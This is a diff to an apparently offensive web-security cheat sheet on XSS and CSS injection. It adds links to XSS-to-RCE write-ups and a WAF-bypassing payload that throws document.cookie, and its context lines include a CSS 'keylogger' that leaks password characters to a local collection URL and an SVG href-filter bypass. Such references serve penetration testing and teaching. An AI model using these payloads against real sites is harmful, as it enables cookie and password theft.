@@ -231,6 +231,11 @@ function handleResponse() {
 </script>
 ```
 
+Other references:
+- GIS3W: [Persistent XSS in G3WSuite 3.5](https://labs.yarix.com/2023/07/gis3w-persistent-xss-in-g3wsuite-3-5-cve-2023-29998/) – CVE-2023-29998
+- [AtMail XSS to RCE](https://bishopfox.com/blog/how-i-built-an-xss-worm-on-atmail)
+- [Chaining XSS, CSRF to achieve RCE](https://rhinosecuritylabs.com/application-security/labkey-server-vulnerabilities-to-rce/)
+
 ## CSS injection and exfiltration
 
 The main technique to exfiltrate information via CSS Injection is to try to match a text with CSS and in case that text exist load some external resource
@@ -257,9 +262,10 @@ input[name=csrf][value^=9]{
 >}
 >```
 
-A CSS "keylogger" can be constructed in the same way [^css-k] :
+A CSS "keylogger" [^video] can be constructed in the same way [^css-k] :
 
 [^css-k]: https://github.com/maxchehab/CSS-Keylogging
+[^video]: [The Curse of Cross-Origin Stylesheets - Web Security Research](https://youtu.be/bMPAXsgWNAc?si=fsmfIXeraW_2bDOM&t=317)
 ```css
 input[type="password"][value$="a"] {
   background-image: url("http://localhost:3000/a");
@@ -300,6 +306,9 @@ postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
 
 <!-- Using SVG to bypass href filtering -->
 <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+
+<!-- I've been using this payload for over a year to discover XSS via open redirect vulnerabilities that bypass WAF https://twitter.com/0xM5awy/status/1704433016427229581 -->
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
 
 ```
 
